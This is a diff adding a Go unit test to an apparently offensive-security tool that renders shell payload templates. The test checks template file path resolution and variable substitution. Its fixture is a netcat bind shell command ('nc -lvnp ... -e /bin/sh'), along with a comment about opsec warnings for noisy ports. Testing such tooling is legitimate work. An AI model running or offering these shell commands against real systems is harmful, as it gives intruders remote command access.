@@ -273,3 +273,50 @@ func TestPayloads_PayloadToSnippet_F33(t *testing.T) {
 	}
 }
 
+func TestPayloads_FolderResolutionAndGeneralPorts_F33(t *testing.T) {
+	tmpDir := t.TempDir()
+
+	// 1. Directory path should resolve to payload_templates.json inside directory
+	resolvedDir := core.ResolveDefaultPayloadFilePath(tmpDir)
+	expectedDirFile := filepath.Join(tmpDir, "payload_templates.json")
+	if resolvedDir != expectedDirFile {
+		t.Errorf("expected folder resolution %q, got %q", expectedDirFile, resolvedDir)
+	}
+
+	// 2. Specific file should resolve directly
+	customFile := filepath.Join(tmpDir, "custom_shells.json")
+	resolvedFile := core.ResolveDefaultPayloadFilePath(customFile)
+	if resolvedFile != customFile {
+		t.Errorf("expected specific file resolution %q, got %q", customFile, resolvedFile)
+	}
+
+	// 3. General port & custom variable substitution
+	tmpl := core.PayloadTemplate{
+		ID:      "test-bind",
+		Name:    "Linux Bind Shell",
+		Command: "nc -lvnp {{PORT}} -e /bin/sh -target {{RHOST}}:{{RPORT}}",
+	}
+
+	vars := core.ExtractPayloadVariables(tmpl)
+	if len(vars) < 3 {
+		t.Errorf("expected at least 3 extracted variables (PORT, RHOST, RPORT), got: %v", vars)
+	}
+
+	// Render with general port in CustomVars
+	res, err := core.RenderPayload(tmpl, core.PayloadRenderOptions{
+		TemplateID: "test-bind",
+		LPORT:      4444, // noisy port should trigger opsec
+		CustomVars: map[string]string{
+			"PORT":  "8080",
+			"RHOST": "192.168.1.50",
+			"RPORT": "9000",
+		},
+	})
+	if err != nil {
+		t.Fatalf("failed to render bind payload: %v", err)
+	}
+	if !strings.Contains(res.Rendered, "nc -lvnp 8080 -e /bin/sh -target 192.168.1.50:9000") {
+		t.Errorf("expected custom PORT override, got: %q", res.Rendered)
+	}
+}
+
